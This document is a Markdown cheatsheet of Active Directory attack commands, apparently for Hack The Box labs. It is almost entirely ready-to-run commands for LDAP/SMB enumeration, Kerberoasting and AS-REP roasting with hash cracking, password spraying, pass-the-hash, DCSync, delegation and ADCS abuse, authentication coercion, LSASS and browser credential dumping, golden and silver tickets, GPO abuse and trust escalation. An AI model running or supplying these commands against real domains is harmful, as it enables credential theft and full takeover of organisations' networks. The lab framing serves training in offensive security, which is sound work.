# Active Directory Attack Cheatsheet

Comprehensive reference for AD attacks commonly seen in HTB machines and ProLabs.

## Enumeration

### BloodHound Collection

```bash
# SharpHound (Windows)
.\SharpHound.exe -c All -d domain.htb --zipfilename loot.zip

# BloodHound.py (Linux)
bloodhound-python -d domain.htb -u user -p 'password' -ns 10.10.10.X -c all

# NetExec BloodHound
nxc ldap 10.10.10.X -u user -p 'pass' -d domain.htb --bloodhound -ns 10.10.10.X --collection All
```

### LDAP Enumeration

```bash
# Anonymous bind
ldapsearch -x -H ldap://10.10.10.X -b "DC=domain,DC=htb"

# Authenticated
ldapsearch -x -H ldap://10.10.10.X -D "user@domain.htb" -w 'password' -b "DC=domain,DC=htb"

# Find users
ldapsearch -x -H ldap://10.10.10.X -D "user@domain.htb" -w 'pass' -b "DC=domain,DC=htb" "(objectClass=user)" sAMAccountName

# Find computers
ldapsearch -x -H ldap://10.10.10.X -D "user@domain.htb" -w 'pass' -b "DC=domain,DC=htb" "(objectClass=computer)" name

# NetExec LDAP
nxc ldap 10.10.10.X -u user -p pass -d domain.htb --users
nxc ldap 10.10.10.X -u user -p pass -d domain.htb --groups
```

### SMB Enumeration

```bash
# Null session
nxc smb 10.10.10.X -u '' -p '' --shares
smbclient -N -L //10.10.10.X

# Authenticated shares
nxc smb 10.10.10.X -u user -p pass --shares
smbclient //10.10.10.X/share -U 'user%pass'

# RID brute force (find users)
nxc smb 10.10.10.X -u '' -p '' --rid-brute

# Spider shares for sensitive files
nxc smb 10.10.10.X -u user -p pass -M spider_plus
```

### RPC Enumeration

```bash
# Null session RPC
rpcclient -U "" -N 10.10.10.X
rpcclient> enumdomusers
rpcclient> enumdomgroups
rpcclient> queryuser 0x1f4

# enum4linux-ng
enum4linux-ng -A 10.10.10.X
```

## Credential Attacks

### AS-REP Roasting

```bash
# Find AS-REP roastable users
impacket-GetNPUsers domain.htb/ -usersfile users.txt -format hashcat -outputfile asrep.hash -dc-ip 10.10.10.X

# With credentials
impacket-GetNPUsers domain.htb/user:pass -request -format hashcat -outputfile asrep.hash

# Crack
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
```

### Kerberoasting

```bash
# Impacket
impacket-GetUserSPNs domain.htb/user:pass -request -outputfile kerberoast.hash

# NetExec
nxc ldap 10.10.10.X -u user -p pass -d domain.htb --kerberoasting kerberoast.hash

# Rubeus (Windows)
.\Rubeus.exe kerberoast /outfile:kerberoast.hash

# Crack
hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt
```

### Password Spraying

```bash
# NetExec
nxc smb 10.10.10.X -u users.txt -p 'Password123!' -d domain.htb --continue-on-success

# Kerbrute
kerbrute passwordspray -d domain.htb --dc 10.10.10.X users.txt 'Password123!'
```

### Pass-the-Hash

```bash
# NetExec
nxc smb 10.10.10.X -u administrator -H <NTLM_HASH> -d domain.htb

# Impacket PsExec
impacket-psexec domain.htb/administrator@10.10.10.X -hashes :<NTLM_HASH>

# Evil-WinRM
evil-winrm -i 10.10.10.X -u administrator -H <NTLM_HASH>

# WMI
impacket-wmiexec domain.htb/administrator@10.10.10.X -hashes :<NTLM_HASH>
```

### DCSync

```bash
# Impacket
impacket-secretsdump domain.htb/user:pass@10.10.10.X -just-dc-ntlm

# Specific user
impacket-secretsdump domain.htb/user:pass@10.10.10.X -just-dc-user administrator

# Mimikatz (Windows)
mimikatz# lsadump::dcsync /domain:domain.htb /user:administrator
```

## Delegation Attacks

### Unconstrained Delegation

```bash
# Find unconstrained delegation computers
impacket-findDelegation domain.htb/user:pass -dc-ip 10.10.10.X

# Monitor for TGTs (Rubeus on Windows)
.\Rubeus.exe monitor /interval:5 /nowrap

# Coerce authentication (PrinterBug/PetitPotam)
python3 printerbug.py domain.htb/user:pass@TARGET_DC 10.10.10.LISTENER
python3 PetitPotam.py 10.10.10.LISTENER 10.10.10.DC
```

### Constrained Delegation

```bash
# Impacket getST
impacket-getST -spn cifs/target.domain.htb -impersonate administrator domain.htb/svc_account:pass

# Use the ticket
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass domain.htb/administrator@target.domain.htb

# S4U2Self + S4U2Proxy
impacket-getST -spn cifs/target.domain.htb -impersonate administrator -dc-ip 10.10.10.X domain.htb/svc_account:pass
```

### Resource-Based Constrained Delegation (RBCD)

```bash
# Add computer account
impacket-addcomputer domain.htb/user:pass -computer-name 'FAKE01$' -computer-pass 'FakePassword123!'

# Set msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-from 'FAKE01$' -delegate-to 'TARGET$' -action write domain.htb/user:pass

# Get service ticket
impacket-getST -spn cifs/target.domain.htb -impersonate administrator domain.htb/'FAKE01$':'FakePassword123!'
```

## ADCS Attacks

### Certipy

```bash
# Enumerate templates
certipy find -u user@domain.htb -p 'pass' -dc-ip 10.10.10.X

# ESC1 - Enrollee supplies subject
certipy req -u user@domain.htb -p 'pass' -ca CA-NAME -template TEMPLATE -upn administrator@domain.htb

# ESC4 - Vulnerable template ACL
certipy template -u user@domain.htb -p 'pass' -template TEMPLATE -save-old

# ESC8 - NTLM relay to ADCS HTTP
certipy relay -ca ca.domain.htb -template DomainController

# Authenticate with certificate
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.X
```

## Lateral Movement

### WinRM

```bash
evil-winrm -i 10.10.10.X -u user -p 'password'
evil-winrm -i 10.10.10.X -u user -H <NTLM_HASH>
```

### PsExec / SMBExec / WMIExec

```bash
impacket-psexec domain.htb/user:pass@10.10.10.X
impacket-smbexec domain.htb/user:pass@10.10.10.X
impacket-wmiexec domain.htb/user:pass@10.10.10.X
impacket-atexec domain.htb/user:pass@10.10.10.X "whoami"
```

### DCOM

```bash
impacket-dcomexec domain.htb/user:pass@10.10.10.X
```

## Post-Exploitation

### Credential Dumping

```bash
# SAM/SYSTEM/SECURITY
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL

# Remote
impacket-secretsdump domain.htb/admin:pass@10.10.10.X

# LSASS dump (Mimikatz)
mimikatz# sekurlsa::logonpasswords

# DPAPI
mimikatz# dpapi::chrome /in:"C:\Users\user\AppData\Local\Google\Chrome\User Data\Default\Login Data"
```

### Golden Ticket

```bash
# Get krbtgt hash first via DCSync
impacket-secretsdump domain.htb/admin:pass@10.10.10.X -just-dc-user krbtgt

# Create golden ticket
impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid S-1-5-21-... -domain domain.htb administrator

# Use it
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass domain.htb/administrator@dc.domain.htb
```

### Silver Ticket

```bash
impacket-ticketer -nthash <SERVICE_HASH> -domain-sid S-1-5-21-... -domain domain.htb -spn cifs/target.domain.htb administrator
```

## GPO Abuse

```bash
# SharpGPOAbuse
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount user --GPOName "Default Domain Policy"

# pyGPOAbuse
python3 pygpoabuse.py domain.htb/user:pass -gpo-id "GPO-GUID" -command 'net localgroup administrators user /add' -f
```

## Trust Attacks

### Cross-Forest Trust

```bash
# Get trust key
mimikatz# lsadump::trust /patch

# Inter-realm TGT
mimikatz# kerberos::golden /user:administrator /domain:child.domain.htb /sid:S-1-5-21-CHILD /krbtgt:HASH /sids:S-1-5-21-PARENT-519 /ptt

# Impacket
impacket-raiseChild domain.htb/admin:pass -target-exec 10.10.10.DC
```
